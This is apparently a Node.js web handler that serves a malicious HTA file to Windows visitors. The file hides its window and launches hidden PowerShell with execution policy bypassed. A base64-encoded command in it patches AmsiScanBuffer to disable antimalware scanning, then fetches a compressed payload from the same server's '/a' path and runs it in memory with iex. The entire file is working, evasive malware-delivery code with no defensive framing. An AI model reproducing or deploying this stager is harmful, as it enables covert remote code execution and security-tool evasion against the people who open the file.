const AMSI = 'Add-Type -TypeDefinition \'using System;using System.Runtime.InteropServices;public class A{[DllImport("kernel32")]public static extern IntPtr GetProcAddress(IntPtr h,string p);[DllImport("kernel32")]public static extern IntPtr LoadLibrary(string n);[DllImport("kernel32")]public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint n,out uint o);public static void P(){var l=LoadLibrary("amsi.dll");var a=GetProcAddress(l,"AmsiScanBuffer");uint o;VirtualProtect(a,(UIntPtr)6,0x40,out o);byte[] b={0xB8,0x57,0x00,0x07,0x80,0xC3};Marshal.Copy(b,0,a,6);}}\';[A]::P()';

module.exports = (req, res) => {
  const proto = req.headers['x-forwarded-proto'] || 'https';
  const base = proto + '://' + req.headers.host;
  const t = Date.now();

  const stub = AMSI
    + ";$u='" + base + "/a?_=" + t + "'"
    + ";$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String((irm $u)))"
    + ";$d=New-Object IO.Compression.DeflateStream($s,[IO.Compression.CompressionMode]::Decompress)"
    + ";$o=New-Object IO.MemoryStream;$d.CopyTo($o)"
    + ";iex([Text.Encoding]::UTF8.GetString($o.ToArray()))";

  const enc = Buffer.from(stub, 'utf16le').toString('base64');

  res.setHeader('Content-Type', 'application/hta');
  res.setHeader('Cache-Control', 'no-store, max-age=0');
  res.status(200).send(
    '<html><head><title>v</title>' +
    '<HTA:APPLICATION SHOWINTASKBAR="no" CAPTION="no" WINDOWSTATE="minimize" SINGLEINSTANCE="yes"/>' +
    '</head><body><script language="VBScript">\r\n' +
    'On Error Resume Next\r\n' +
    'CreateObject("WScript.Shell").Run "powershell -nop -ni -w h -ep bypass -enc ' + enc + '",0,False\r\n' +
    'window.close\r\n' +
    '</script></body></html>'
  );
};
